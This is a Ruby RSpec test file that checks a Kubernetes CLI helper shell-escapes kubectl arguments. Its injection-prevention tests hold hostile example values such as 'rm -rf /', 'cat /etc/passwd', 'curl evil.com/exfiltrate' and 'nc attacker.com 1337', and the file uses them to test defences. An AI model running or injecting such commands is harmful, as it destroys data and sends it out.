# frozen_string_literal: true

require 'spec_helper'
require 'shellwords'

# Define the namespace for the test
module LanguageOperator
  module CLI
    module Helpers
      # Define a minimal ClusterValidator for testing
      module ClusterValidator
        def self.get_cluster(name)
          name
        end

        def self.get_cluster_config(_name)
          { namespace: 'default' }
        end

        def self.kubernetes_client(_name)
          double('Kubernetes::Client')
        end
      end
    end
  end
end

require_relative '../../../../lib/language_operator/cli/helpers/cluster_context'

RSpec.describe LanguageOperator::CLI::Helpers::ClusterContext do
  let(:basic_config) do
    {
      kubeconfig: '/home/user/.kube/config',
      context: 'production',
      namespace: 'default'
    }
  end

  let(:mock_client) { double('Kubernetes::Client') }

  describe '#kubectl_args' do
    context 'with normal configuration' do
      let(:context) { described_class.new('test-cluster', basic_config, mock_client) }

      it 'generates properly escaped kubectl arguments' do
        args = context.kubectl_args

        expect(args[:kubeconfig]).to eq('--kubeconfig=/home/user/.kube/config')
        expect(args[:context]).to eq('--context=production')
        expect(args[:namespace]).to eq('-n default')
      end
    end

    context 'with missing optional configurations' do
      let(:minimal_config) { { namespace: 'test' } }
      let(:context) { described_class.new('test-cluster', minimal_config, mock_client) }

      it 'handles missing kubeconfig and context gracefully' do
        args = context.kubectl_args

        expect(args[:kubeconfig]).to eq('')
        expect(args[:context]).to eq('')
        expect(args[:namespace]).to eq('-n test')
      end
    end

    context 'security: command injection prevention' do
      it 'escapes malicious kubeconfig paths' do
        malicious_config = basic_config.merge(
          kubeconfig: 'config.yaml; rm -rf /'
        )
        context = described_class.new('test-cluster', malicious_config, mock_client)

        args = context.kubectl_args
        expect(args[:kubeconfig]).to eq('--kubeconfig=config.yaml\;\ rm\ -rf\ /')
      end

      it 'escapes malicious context names' do
        malicious_config = basic_config.merge(
          context: 'prod; curl attacker.com'
        )
        context = described_class.new('test-cluster', malicious_config, mock_client)

        args = context.kubectl_args
        expect(args[:context]).to eq('--context=prod\;\ curl\ attacker.com')
      end

      it 'escapes malicious namespace names' do
        malicious_config = basic_config.merge(
          namespace: 'default; kubectl delete all --all'
        )
        context = described_class.new('test-cluster', malicious_config, mock_client)

        args = context.kubectl_args
        expect(args[:namespace]).to eq('-n default\;\ kubectl\ delete\ all\ --all')
      end

      it 'escapes paths with spaces' do
        spaced_config = basic_config.merge(
          kubeconfig: '/path with spaces/config.yaml'
        )
        context = described_class.new('test-cluster', spaced_config, mock_client)

        args = context.kubectl_args
        expect(args[:kubeconfig]).to eq('--kubeconfig=/path\ with\ spaces/config.yaml')
      end

      it 'escapes context names with special characters' do
        special_config = basic_config.merge(
          context: 'prod-cluster_v2.0'
        )
        context = described_class.new('test-cluster', special_config, mock_client)

        args = context.kubectl_args
        expect(args[:context]).to eq('--context=prod-cluster_v2.0')
      end

      it 'escapes shell metacharacters in all fields' do
        dangerous_config = {
          kubeconfig: 'file`whoami`.yaml',
          context: 'ctx$(id)',
          namespace: 'ns|cat /etc/passwd'
        }
        context = described_class.new('test-cluster', dangerous_config, mock_client)

        args = context.kubectl_args
        expect(args[:kubeconfig]).to eq('--kubeconfig=file\\`whoami\\`.yaml')
        expect(args[:context]).to eq('--context=ctx\\$\\(id\\)')
        expect(args[:namespace]).to eq('-n ns\\|cat\ /etc/passwd')
      end
    end
  end

  describe '#kubectl_prefix' do
    let(:context) { described_class.new('test-cluster', basic_config, mock_client) }

    it 'builds complete kubectl command prefix' do
      prefix = context.kubectl_prefix
      expected = 'kubectl --kubeconfig=/home/user/.kube/config --context=production -n default'
      expect(prefix).to eq(expected)
    end

    it 'handles missing optional configurations' do
      minimal_config = { namespace: 'test' }
      context = described_class.new('test-cluster', minimal_config, mock_client)

      prefix = context.kubectl_prefix
      expect(prefix).to eq('kubectl -n test')
    end

    it 'properly formats and cleans whitespace' do
      config_with_nils = { kubeconfig: nil, context: nil, namespace: 'test' }
      context = described_class.new('test-cluster', config_with_nils, mock_client)

      prefix = context.kubectl_prefix
      # Should have no extra spaces
      expect(prefix).to eq('kubectl -n test')
      expect(prefix).not_to match(/\s{2,}/)
    end

    context 'security: complete command injection scenarios' do
      it 'prevents injection via combined malicious inputs' do
        malicious_config = {
          kubeconfig: 'cfg; echo "pwned" > /tmp/hacked',
          context: 'ctx && curl evil.com/exfiltrate',
          namespace: 'ns | nc attacker.com 1337'
        }
        context = described_class.new('test-cluster', malicious_config, mock_client)

        prefix = context.kubectl_prefix

        # All dangerous characters should be escaped
        expect(prefix).to include('cfg\\;')
        expect(prefix).to include('ctx\\ \\&\\&')
        expect(prefix).to include('ns\\ \\|')

        # Verify no unescaped dangerous characters remain
        expect(prefix).not_to match(/[^\\];/)
        expect(prefix).not_to match(/[^\\]&&/)
        expect(prefix).not_to match(/[^\\]\|/)
      end

      it 'handles edge case: empty strings' do
        empty_config = { namespace: '' }
        context = described_class.new('test-cluster', empty_config, mock_client)

        # Should not crash and should escape empty namespace
        expect { context.kubectl_prefix }.not_to raise_error
        expect(context.kubectl_prefix).to include('-n ')
      end

      it 'handles edge case: nil namespace' do
        nil_config = { namespace: nil }
        context = described_class.new('test-cluster', nil_config, mock_client)

        # Should not crash when namespace is nil
        expect { context.kubectl_prefix }.not_to raise_error
      end
    end

    context 'regression: existing functionality preserved' do
      it 'maintains backward compatibility with normal use cases' do
        # Common real-world configurations should work unchanged
        real_world_configs = [
          {
            kubeconfig: '/Users/dev/.kube/config',
            context: 'kind-dev-cluster',
            namespace: 'language-operator'
          },
          {
            kubeconfig: '/home/jenkins/.kube/prod-config',
            context: 'gke_project_us-central1-a_prod-cluster',
            namespace: 'default'
          },
          {
            context: 'minikube',
            namespace: 'kube-system'
          }
        ]

        real_world_configs.each do |config|
          context = described_class.new('test', config, mock_client)
          expect { context.kubectl_prefix }.not_to raise_error

          prefix = context.kubectl_prefix
          expect(prefix).to start_with('kubectl')
          expect(prefix).to include('-n')
        end
      end
    end
  end

  describe '.from_options' do
    let(:mock_validator) { class_double(LanguageOperator::CLI::Helpers::ClusterValidator) }
    let(:options) { { cluster: 'test-cluster' } }

    before do
      stub_const('LanguageOperator::CLI::Helpers::ClusterValidator', mock_validator)
      allow(mock_validator).to receive(:get_cluster).with('test-cluster').and_return('test-cluster')
      allow(mock_validator).to receive(:get_cluster_config).with('test-cluster').and_return(basic_config)
      allow(mock_validator).to receive(:kubernetes_client).with('test-cluster').and_return(mock_client)
    end

    it 'creates context from command options' do
      context = described_class.from_options(options)

      expect(context.name).to eq('test-cluster')
      expect(context.config).to eq(basic_config)
      expect(context.client).to eq(mock_client)
      expect(context.namespace).to eq('default')
    end
  end
end
